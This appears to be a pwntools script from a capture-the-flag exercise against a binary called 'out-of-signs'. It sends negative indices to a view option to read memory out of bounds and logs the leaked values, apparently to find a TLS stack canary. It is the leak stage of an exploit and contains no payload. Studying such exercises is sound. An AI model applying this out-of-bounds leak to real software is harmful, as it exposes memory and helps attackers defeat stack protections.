from pwn import *

context.log_level = 'info'
exe = './out-of-signs'
elf = context.binary = ELF(exe)

io = process(exe)
# io = remote('host', port)
gdb.attach(io)

def view_raw(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())
    return io.recv(16, timeout=0.3)   # just this — no extra recvuntil

tls_canary_off = 0x3ba768
leaks = {}
for idx in range(-1128911571479866045, -1128911571479866045-100, -1):
    raw = view_raw(idx)
    if raw and len(raw) == 16:
        q0, q1 = u64(raw[:8]), u64(raw[8:16])
        leaks[idx] = (q0, q1)
        log.info(f"idx {idx:>4} | +0x0: {q0:#018x}  +0x8: {q1:#018x}")

io.interactive()
